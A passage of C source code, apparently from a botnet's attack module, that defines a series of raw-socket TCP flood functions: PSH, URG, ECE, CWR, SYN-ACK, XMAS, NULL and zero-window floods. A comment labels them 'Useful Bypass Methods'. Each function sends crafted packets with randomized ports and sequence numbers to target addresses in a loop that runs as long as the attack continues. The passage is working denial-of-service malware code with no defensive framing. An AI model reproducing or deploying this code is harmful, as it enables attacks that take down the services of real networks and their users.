    tcph->rst = TRUE;
    tcph->doff = 5;
    tcph->window = rand_next();

    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;

    for (int i = 0; i < targs_len; i++) {
        sin.sin_addr.s_addr = targs[i].addr.s_addr;
        iph->saddr = LOCAL_ADDR;
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = 0;
        iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

        while (attack_ongoing[0]) {
            tcph->source = rand_next();
            tcph->seq = rand_next();
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
            sendto(fd, tcp_packet, sizeof(struct iphdr) + sizeof(struct tcphdr), 0,
                  (struct sockaddr *)&sin, sizeof(sin));
        }
    }
    close(fd);
}

void attack_psh_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                      int targs_len, struct attack_option *opts, int opts_len) {
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) return;

    uint16_t dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = 80;

    char tcp_packet[1500];
    struct iphdr *iph = (struct iphdr *)tcp_packet;
    struct tcphdr *tcph = (struct tcphdr *)(tcp_packet + sizeof(struct iphdr));

    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;

    tcph->dest = htons(dport);
    tcph->psh = TRUE;
    tcph->doff = 5;
    tcph->window = rand_next();

    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;

    for (int i = 0; i < targs_len; i++) {
        sin.sin_addr.s_addr = targs[i].addr.s_addr;
        iph->saddr = LOCAL_ADDR;
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = 0;
        iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

        while (attack_ongoing[0]) {
            tcph->source = rand_next();
            tcph->seq = rand_next();
            tcph->ack_seq = rand_next();
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
            sendto(fd, tcp_packet, sizeof(struct iphdr) + sizeof(struct tcphdr), 0,
                  (struct sockaddr *)&sin, sizeof(sin));
        }
    }
    close(fd);
}

void attack_urg_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                      int targs_len, struct attack_option *opts, int opts_len) {
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) return;

    uint16_t dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = 80;

    char tcp_packet[1500];
    struct iphdr *iph = (struct iphdr *)tcp_packet;
    struct tcphdr *tcph = (struct tcphdr *)(tcp_packet + sizeof(struct iphdr));

    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;

    tcph->dest = htons(dport);
    tcph->urg = TRUE;
    tcph->doff = 5;
    tcph->window = rand_next();

    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;

    for (int i = 0; i < targs_len; i++) {
        sin.sin_addr.s_addr = targs[i].addr.s_addr;
        iph->saddr = LOCAL_ADDR;
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = 0;
        iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

        while (attack_ongoing[0]) {
            tcph->source = rand_next();
            tcph->seq = rand_next();
            tcph->ack_seq = rand_next();
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
            sendto(fd, tcp_packet, sizeof(struct iphdr) + sizeof(struct tcphdr), 0,
                  (struct sockaddr *)&sin, sizeof(sin));
        }
    }
    close(fd);
}

void attack_ece_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                      int targs_len, struct attack_option *opts, int opts_len) {
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) return;

    uint16_t dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = 80;

    char tcp_packet[1500];
    struct iphdr *iph = (struct iphdr *)tcp_packet;
    struct tcphdr *tcph = (struct tcphdr *)(tcp_packet + sizeof(struct iphdr));

    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;

    tcph->dest = htons(dport);
    tcph->ece = TRUE;
    tcph->doff = 5;
    tcph->window = rand_next();

    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;

    for (int i = 0; i < targs_len; i++) {
        sin.sin_addr.s_addr = targs[i].addr.s_addr;
        iph->saddr = LOCAL_ADDR;
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = 0;
        iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

        while (attack_ongoing[0]) {
            tcph->source = rand_next();
            tcph->seq = rand_next();
            tcph->ack_seq = rand_next();
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
            sendto(fd, tcp_packet, sizeof(struct iphdr) + sizeof(struct tcphdr), 0,
                  (struct sockaddr *)&sin, sizeof(sin));
        }
    }
    close(fd);
}

void attack_cwr_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                      int targs_len, struct attack_option *opts, int opts_len) {
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) return;

    uint16_t dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = 80;

    char tcp_packet[1500];
    struct iphdr *iph = (struct iphdr *)tcp_packet;
    struct tcphdr *tcph = (struct tcphdr *)(tcp_packet + sizeof(struct iphdr));

    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;

    tcph->dest = htons(dport);
    tcph->cwr = TRUE;
    tcph->doff = 5;
    tcph->window = rand_next();

    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;

    for (int i = 0; i < targs_len; i++) {
        sin.sin_addr.s_addr = targs[i].addr.s_addr;
        iph->saddr = LOCAL_ADDR;
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = 0;
        iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

        while (attack_ongoing[0]) {
            tcph->source = rand_next();
            tcph->seq = rand_next();
            tcph->ack_seq = rand_next();
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
            sendto(fd, tcp_packet, sizeof(struct iphdr) + sizeof(struct tcphdr), 0,
                  (struct sockaddr *)&sin, sizeof(sin));
        }
    }
    close(fd);
}

/* =========================================================================
 * New TCP Flood Methods (Useful Bypass Methods)
 * ========================================================================= */

void attack_tcpconn_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                          int targs_len, struct attack_option *opts, int opts_len) {
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) return;

    uint16_t dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = 80;

    char tcp_packet[1500];
    struct iphdr *iph = (struct iphdr *)tcp_packet;
    struct tcphdr *tcph = (struct tcphdr *)(tcp_packet + sizeof(struct iphdr));

    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;

    tcph->dest = htons(dport);
    tcph->syn = TRUE;
    tcph->ack = TRUE;  /* Full handshake simulation */
    tcph->doff = 5;
    tcph->window = rand_next();

    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;

    for (int i = 0; i < targs_len; i++) {
        sin.sin_addr.s_addr = targs[i].addr.s_addr;
        iph->saddr = LOCAL_ADDR;
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = 0;
        iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

        while (attack_ongoing[0]) {
            tcph->source = rand_next();
            tcph->seq = rand_next();
            tcph->ack_seq = rand_next();
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
            sendto(fd, tcp_packet, sizeof(struct iphdr) + sizeof(struct tcphdr), 0,
                  (struct sockaddr *)&sin, sizeof(sin));
        }
    }
    close(fd);
}

void attack_xmas_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                       int targs_len, struct attack_option *opts, int opts_len) {
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) return;

    uint16_t dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = 80;

    char tcp_packet[1500];
    struct iphdr *iph = (struct iphdr *)tcp_packet;
    struct tcphdr *tcph = (struct tcphdr *)(tcp_packet + sizeof(struct iphdr));

    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;

    tcph->dest = htons(dport);
    tcph->fin = TRUE;
    tcph->syn = TRUE;
    tcph->rst = TRUE;
    tcph->psh = TRUE;
    tcph->ack = TRUE;
    tcph->urg = TRUE;  /* XMAS - all flags set */
    tcph->doff = 5;
    tcph->window = rand_next();

    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;

    for (int i = 0; i < targs_len; i++) {
        sin.sin_addr.s_addr = targs[i].addr.s_addr;
        iph->saddr = LOCAL_ADDR;
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = 0;
        iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

        while (attack_ongoing[0]) {
            tcph->source = rand_next();
            tcph->seq = rand_next();
            tcph->ack_seq = rand_next();
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
            sendto(fd, tcp_packet, sizeof(struct iphdr) + sizeof(struct tcphdr), 0,
                  (struct sockaddr *)&sin, sizeof(sin));
        }
    }
    close(fd);
}

void attack_null_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                       int targs_len, struct attack_option *opts, int opts_len) {
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) return;

    uint16_t dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = 80;

    char tcp_packet[1500];
    struct iphdr *iph = (struct iphdr *)tcp_packet;
    struct tcphdr *tcph = (struct tcphdr *)(tcp_packet + sizeof(struct iphdr));

    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;

    tcph->dest = htons(dport);
    /* NULL - no flags set */
    tcph->doff = 5;
    tcph->window = rand_next();

    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;

    for (int i = 0; i < targs_len; i++) {
        sin.sin_addr.s_addr = targs[i].addr.s_addr;
        iph->saddr = LOCAL_ADDR;
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = 0;
        iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

        while (attack_ongoing[0]) {
            tcph->source = rand_next();
            tcph->seq = rand_next();
            tcph->ack_seq = rand_next();
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
            sendto(fd, tcp_packet, sizeof(struct iphdr) + sizeof(struct tcphdr), 0,
                  (struct sockaddr *)&sin, sizeof(sin));
        }
    }
    close(fd);
}

void attack_window_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                         int targs_len, struct attack_option *opts, int opts_len) {
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) return;

    uint16_t dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = 80;

    char tcp_packet[1500];
    struct iphdr *iph = (struct iphdr *)tcp_packet;
    struct tcphdr *tcph = (struct tcphdr *)(tcp_packet + sizeof(struct iphdr));

    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;

    tcph->dest = htons(dport);
    tcph->ack = TRUE;
    tcph->doff = 5;
    tcph->window = 0;  /* Zero window - causes issues */

    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;

    for (int i = 0; i < targs_len; i++) {
        sin.sin_addr.s_addr = targs[i].addr.s_addr;
        iph->saddr = LOCAL_ADDR;
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = 0;
        iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

        while (attack_ongoing[0]) {
            tcph->source = rand_next();
            tcph->seq = rand_next();
            tcph->ack_seq = rand_next();
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
            sendto(fd, tcp_packet, sizeof(struct iphdr) + sizeof(struct tcphdr), 0,
                  (struct sockaddr *)&sin, sizeof(sin));
        }
    }
    close(fd);
}
